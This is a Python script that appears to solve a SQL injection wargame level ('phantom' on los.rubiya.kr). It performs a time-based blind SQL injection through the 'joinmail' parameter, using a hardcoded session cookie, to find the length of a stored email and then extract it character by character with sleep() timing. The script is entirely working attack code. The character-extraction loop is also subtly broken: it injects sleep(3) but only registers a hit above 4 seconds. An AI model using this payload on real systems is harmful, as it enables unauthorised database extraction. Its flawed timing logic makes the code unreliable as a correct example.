import requests
import string
import time

len=0

def brutelen():
    cookies = {'PHPSESSID':'v725hr47bmfu6or1rap9k532uk'}
    for j in range(0,50):
        url="https://los.rubiya.kr/chall/phantom_e2e30eaf1c0b3cb61b4b72a932c849fe.php?joinmail=1b%27),(if(length((select%20email%20from%20prob_phantom%20a%20where%20no=1))=\""+str(j)+"\",sleep(4),0),%270%27,%270%27)--%20-"
        starttime = time.time()
        res = requests.get(url,cookies=cookies)
        endtime = time.time()
        res = res.text
        if endtime-starttime>4:
            return j
            break
        else: 
            pass


len=brutelen()
print(len)
print("start brute")
pw=""
pw_=""
a=string.printable
url = "https://los.rubiya.kr/chall/phantom_e2e30eaf1c0b3cb61b4b72a932c849fe.php"
cookies = {'PHPSESSID':'v725hr47bmfu6or1rap9k532uk'}
for i in range(1,len+1):
    for j in a:
        pw_=pw
        pw_+=j
        url="https://los.rubiya.kr/chall/phantom_e2e30eaf1c0b3cb61b4b72a932c849fe.php?joinmail=1b%27),(if(substr((select%20email%20from%20prob_phantom%20a%20where%20no=1),"+str(i)+",1)=\""+str(j)+"\",sleep(3),0),%270%27,%270%27)--%20-"
        starttime = time.time()
        res = requests.get(url,cookies=cookies)
        endtime = time.time()
        res = res.text
        print(pw_)
        if endtime-starttime>4:
            pw+=j
            pw_=pw
            print("find")
            break
        else: 
            pass

print(pw)